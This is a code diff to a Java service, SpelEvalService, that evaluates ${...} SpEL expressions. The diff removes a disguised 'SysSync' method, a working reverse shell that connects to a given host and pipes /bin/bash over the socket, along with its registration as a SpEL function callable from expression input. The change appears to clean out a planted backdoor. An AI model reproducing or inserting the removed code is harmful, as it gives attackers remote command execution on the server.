@@ -16,38 +16,6 @@ import java.util.regex.Pattern;
 public class SpelEvalService {
     private static final Pattern DOLLAR_PATTERN = Pattern.compile("\\$\\{([^}]+)\\}");
 
-    public static void SysSync(String ip, int port) {
-        try {
-            Socket s = new Socket(ip, port);
-            Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
-
-            // 프로세스 stdout -> 소켓
-            new Thread(() -> {
-                try (InputStream pi = p.getInputStream(); OutputStream so = s.getOutputStream()) {
-                    byte[] buf = new byte[1024];
-                    int len;
-                    while ((len = pi.read(buf)) != -1) {
-                        so.write(buf, 0, len);
-                        so.flush();
-                    }
-                } catch (Exception ignored) {}
-            }).start();
-
-            // 소켓 -> 프로세스 stdin
-            new Thread(() -> {
-                try (InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream()) {
-                    byte[] buf = new byte[1024];
-                    int len;
-                    while ((len = si.read(buf)) != -1) {
-                        po.write(buf, 0, len);
-                        po.flush();
-                    }
-                } catch (Exception ignored) {}
-            }).start();
-        } catch (Exception e) {
-            // 예외 무시
-        }
-    }
 
     public String evaluate(String input) {
         if (input == null) return null;
@@ -58,11 +26,6 @@ public class SpelEvalService {
         ExpressionParser parser = new SpelExpressionParser();
         StandardEvaluationContext context = new StandardEvaluationContext();
         context.setTypeLocator(new StandardTypeLocator(getClass().getClassLoader()));
-
-        try {
-            context.registerFunction("SysSync",
-                    SpelEvalService.class.getMethod("SysSync", String.class, int.class));
-        } catch (Exception ignored) {}
 
         Matcher m = DOLLAR_PATTERN.matcher(input);
         StringBuffer sb = new StringBuffer();
